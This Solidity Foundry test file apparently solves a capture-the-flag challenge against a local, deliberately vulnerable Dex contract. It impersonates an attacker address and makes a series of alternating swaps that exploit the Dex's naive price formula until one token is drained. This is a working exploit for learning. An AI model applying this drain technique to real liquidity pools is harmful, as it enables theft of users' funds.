// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import {Dex, SwappableToken} from "../Dex.sol";

contract ContractTest is Test {
    Dex dex;
    SwappableToken token0;
    SwappableToken token1;

    function test_challenge_22() public {
        console.log("Challenge #22");

        dex = new Dex();

        token0 = new SwappableToken(address(dex), "ABC", "ABC", 1000);
        token1 = new SwappableToken(address(dex), "XYZ", "XYZ", 1000);

        dex.setTokens(address(token0), address(token1));
        dex.approve(address(dex), 100);
        dex.addLiquidity(address(token0), 100);
        dex.addLiquidity(address(token1), 100);

        token0.transfer(address(1337), 10);
        token1.transfer(address(1337), 10);

        console.log("dex token0 balance", token0.balanceOf(address(dex)));
        console.log("dex token1 balance", token1.balanceOf(address(dex)));

        console.log("1337 token0 balance", token0.balanceOf(address(1337)));
        console.log("1337 token0 balance", token1.balanceOf(address(1337)));

        vm.startPrank(address(1337));

        dex.approve(address(dex), 1000);
        dex.swap(address(token0), address(token1), 10);
        logSwapPrice();
        dex.swap(address(token1), address(token0), 20);
        logSwapPrice();
        dex.swap(address(token0), address(token1), 24);
        logSwapPrice();
        dex.swap(address(token1), address(token0), 30);
        logSwapPrice();
        dex.swap(address(token0), address(token1), 41);
        logSwapPrice();
        dex.swap(address(token1), address(token0), 45);
        logSwapPrice();

        vm.stopPrank();

        console.log("Token0 drained from dex!");
    }

    function logSwapPrice() public {
        console.log("-------------- SWAP -----------------");
        console.log("1337 token0 balance", token0.balanceOf(address(1337)));
        console.log("1337 token1 balance", token1.balanceOf(address(1337)));
        console.log("dex  token0 balance", token0.balanceOf(address(dex)));
        console.log("dex  token1 balance", token1.balanceOf(address(dex)));
        console.log("");
    }
}
